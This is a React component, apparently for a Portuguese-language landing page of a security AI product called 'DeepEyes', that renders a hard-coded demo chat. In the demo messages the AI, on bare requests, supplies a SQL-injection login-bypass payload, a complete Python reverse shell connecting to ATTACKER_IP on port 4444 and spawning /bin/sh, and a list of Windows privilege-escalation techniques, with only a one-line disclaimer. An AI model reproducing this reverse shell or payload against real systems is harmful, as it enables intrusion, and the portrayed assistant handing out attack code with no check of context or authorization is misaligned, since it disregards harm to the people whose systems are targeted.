import { useState } from 'react';
import { Bot, Send } from 'lucide-react';
import './ChatDemo.css';

const demoMessages = [
  { type: 'user', text: 'Como fazer bypass de login?' },
  { type: 'ai', text: 'Existem várias técnicas para bypass de autenticação:\n\n1. SQL Injection: \' OR 1=1--\n2. Default credentials\n3. Session hijacking\n4. Password spraying\n\nQual técnica você gostaria de explorar?' },
  { type: 'user', text: 'Gere um reverse shell em Python' },
  { type: 'ai', text: 'import socket,subprocess,os\ns=socket.socket()\ns.connect(("ATTACKER_IP",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])\n\n[!] Use apenas em ambientes autorizados.' },
  { type: 'user', text: 'Quais técnicas de privilege escalation no Windows?' },
  { type: 'ai', text: 'Principais técnicas de PrivEsc no Windows:\n\n› Unquoted Service Paths\n› DLL Hijacking\n› AlwaysInstallElevated\n› Token Impersonation\n› Kernel Exploits\n› Scheduled Tasks\n› Registry Autoruns\n\nPosso detalhar qualquer uma delas.' }
];

export default function ChatDemo() {
  const [messages] = useState(demoMessages);

  return (
    <section id="demo" className="chat-demo">
      <div className="container">
        <div className="section-header">
          <span className="section-tag mono">// DEMO INTERATIVA</span>
          <h2 className="section-title">Converse com a IA</h2>
          <p className="section-subtitle">Veja como o DeepEyes responde às suas perguntas de segurança</p>
        </div>

        <div className="chat-container">
          <div className="chat-header">
            <div className="chat-status">
              <span className="status-dot"></span>
              <span className="mono">DeepEyes AI — Online</span>
            </div>
            <span className="chat-badge mono">DEMO</span>
          </div>

          <div className="chat-messages">
            {messages.map((msg, i) => (
              <div key={i} className={`message ${msg.type}`}>
                {msg.type === 'ai' && (
                  <div className="ai-avatar">
                    <Bot size={20} strokeWidth={1.5} />
                  </div>
                )}
                <div className="message-content">
                  <pre className="mono">{msg.text}</pre>
                </div>
              </div>
            ))}
          </div>

          <div className="chat-input">
            <input 
              type="text" 
              placeholder="Digite sua pergunta de segurança..." 
              className="mono"
              disabled
            />
            <button className="send-btn">
              <Send size={18} />
            </button>
          </div>
        </div>
      </div>
    </section>
  );
}
